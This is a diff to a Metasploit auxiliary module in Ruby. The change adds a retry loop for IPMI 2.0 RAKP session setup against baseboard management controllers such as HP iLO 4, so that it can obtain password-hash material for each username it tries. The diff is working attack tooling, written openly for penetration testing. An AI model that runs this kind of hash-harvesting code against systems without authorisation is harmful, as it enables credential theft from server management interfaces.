@@ -81,52 +81,77 @@ class Metasploit3 < Msf::Auxiliary
 
 			vprint_status("#{rhost} Trying username '#{username}'...")
 
-			r = nil
-			1.upto(3) do
-				udp_send(Rex::Proto::IPMI::Utils.create_ipmi_session_open_request(console_session_id))
-				r = udp_recv(5.0)
-				break if r
+			rakp = nil
+			sess = nil
+
+			# It may take multiple tries to get a working "session" on certain BMCs (HP iLO 4, etc)
+			1.upto(5) do |attempt|
+
+				r = nil
+				1.upto(3) do
+					udp_send(Rex::Proto::IPMI::Utils.create_ipmi_session_open_request(console_session_id))
+					r = udp_recv(5.0)
+					break if r
+				end
+
+				unless r
+					vprint_status("#{rhost} No response to IPMI open session request, stopping test")
+					rakp = nil 
+					break
+				end
+				
+				sess = process_opensession_reply(*r)
+				unless sess
+					vprint_status("#{rhost} Could not understand the response to the open session request, stopping test")
+					rakp = nil 
+					break
+				end
+
+				r = nil
+				1.upto(3) do
+					udp_send(Rex::Proto::IPMI::Utils.create_ipmi_rakp_1(sess.bmc_session_id, console_random_id, username))
+					r = udp_recv(5.0)
+					break if r
+				end
+
+				unless r
+					vprint_status("#{rhost} No response to RAKP1 message")
+					next
+				end
+				
+				rakp = process_rakp1_reply(*r)
+				unless rakp
+					vprint_status("#{rhost} Could not understand the response to the RAKP1 request")
+					rakp = nil 
+					break
+				end
+
+				# Sleep and retry on session ID errors
+				if rakp.error_code == 2
+					vprint_error("#{rhost} Returned a Session ID error for username #{username} on attempt #{attempt}")
+					Rex.sleep(1)
+					next
+				end
+
+				if rakp.error_code != 0
+					vprint_error("#{rhost} Returned error code #{rakp.error_code} for username #{username}: #{Rex::Proto::IPMI::RMCP_ERRORS[rakp.error_code].to_s}")
+					rakp = nil 
+					break
+				end
+
+				# TODO: Finish documenting this error field
+				if rakp.ignored1 != 0
+					vprint_error("#{rhost} Returned error code #{rakp.ignored1} for username #{username}")
+					rakp = nil 
+					break
+				end
+
+				# Break out of the session retry code if we make it here
+				break
 			end
 
-			unless r
-				vprint_status("#{rhost} No response to IPMI open session request, stopping test")
-				return
-			end
-			
-			sess = process_opensession_reply(*r)
-			unless sess
-				vprint_status("#{rhost} Could not understand the response to the open session request, stopping test")
-				return
-			end
-
-			r = nil
-			1.upto(3) do
-				udp_send(Rex::Proto::IPMI::Utils.create_ipmi_rakp_1(sess.bmc_session_id, console_random_id, username))
-				r = udp_recv(5.0)
-				break if r
-			end
-
-			unless r
-				vprint_status("#{rhost} No response to RAKP1 message")
-				next
-			end
-			
-			rakp = process_rakp1_reply(*r)
-			unless rakp
-				vprint_status("#{rhost} Could not understand the response to the RAKP1 request")
-				next
-			end
-
-			if rakp.error_code != 0
-				vprint_error("#{rhost} Returned error code #{rakp.error_code} for username #{username}: #{Rex::Proto::IPMI::RMCP_ERRORS[rakp.error_code].to_s}")
-				next
-			end
-
-			# TODO: Finish documenting this error field
-			if rakp.ignored1 != 0
-				vprint_error("#{rhost} Returned error code #{rakp.ignored1} for username #{username}")
-				next
-			end
+			# Skip to the next user if we didnt get a valid response
+			next if not rakp
 
 			# Calculate the salt used in the hmac-sha1 hash
 			hmac_buffer = Rex::Proto::IPMI::Utils.create_rakp_hmac_sha1_salt(
